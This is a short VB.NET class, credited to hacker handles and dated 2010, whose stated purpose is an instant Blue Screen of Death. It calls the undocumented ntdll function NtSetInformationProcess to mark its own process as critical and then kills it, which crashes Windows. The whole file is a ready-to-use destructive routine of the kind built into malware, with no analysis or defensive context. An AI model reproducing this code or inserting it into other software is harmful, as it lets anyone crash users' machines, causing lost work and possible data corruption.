'Release Date   :   10/5/2010
'Credits        :   AeonHack,Devil's Child,Wrox Programming
'Purpose    :   Instant Bluescreen Of Death(BSOD)
Imports System.Runtime.InteropServices
Public Class mBlueScreen
    <DllImport("ntdll")>
    Shared Function NtSetInformationProcess(ByVal p As IntPtr, ByVal c As Integer, ByRef i As Integer, ByVal l As Integer) As Integer
    End Function
    Public Shared Sub BSOD()
        Dim mProc As Process = Process.GetCurrentProcess()
        Process.EnterDebugMode()
        NtSetInformationProcess(mProc.Handle, 29, 1, 4)
        mProc.Kill()
    End Sub
End Class